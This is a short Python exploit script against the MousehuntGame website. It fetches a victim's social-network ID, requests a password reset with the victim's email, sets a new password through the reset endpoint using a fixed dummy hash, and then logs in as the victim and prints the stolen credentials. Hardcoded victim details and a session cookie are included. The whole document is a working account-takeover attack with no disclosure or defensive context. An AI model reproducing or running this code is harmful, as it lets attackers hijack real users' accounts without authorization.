victim_id = 8322312
victim_username = 'vulnerablehunter'
victim_new_password = 'Pwn3dLOL'
victim_email = 'joey@tribbiani.com'

own_cookie = 'PQVtUl3iX1FIGSz8Mnf8tcYk54J12Iv99SPGlqWR73yj25W0NNePRRUr9kpFXu2N'
own_uh = 'qM2IyRHr'

import json,requests
try:
	print('[=] requesting user info for id %s'%victim_id)
	r =  json.loads(requests.post('https://www.mousehuntgame.com/managers/ajax/pages/friends.php',{'sn':'Hitgrab','hg_is_ajax':'1','action':'community_search_by_id','user_id':victim_id,'uh':own_uh},cookies={'HG_TOKEN':own_cookie}).text)
	vi,vn = r['friend']['sn_user_id'],r['friend']['name']
except: print('[-] failed--check creds');quit()
print('[+] obtained snuid %s for user %s'%(vi,vn))

if victim_email:
	print('[=] requesting account reset')
	r =  json.loads(requests.post('https://www.mousehuntgame.com/managers/ajax/users/session.php',{'sn':'Hitgrab','hg_is_ajax':'1','action':'resetPassword','email':victim_email}).text)
	if r['success']: print('[+] request successful')
	else: print('[-] request failed. proceeding anyway');print(r)
else: print('[=] assuming that account reset has been requested')

print('[=] changing user password')
requests.post('https://www.mousehuntgame.com/reset-password/?snuid='+vi+'&h=AAA&clientPlatform=desktop&type=forgot',{'pass1':victim_new_password,'pass2':victim_new_password})

print('[=] attempting to login')
r =  json.loads(requests.post('https://www.mousehuntgame.com/managers/ajax/users/session.php',{'sn':'Hitgrab','hg_is_ajax':'1','action':'loginHitGrab','username':victim_username,'password':victim_new_password}).text)
if r['success']: print('[+] success! %s\'s credentials are %s:%s'%(vn,victim_username,victim_new_password))
else: print('[-] failed')
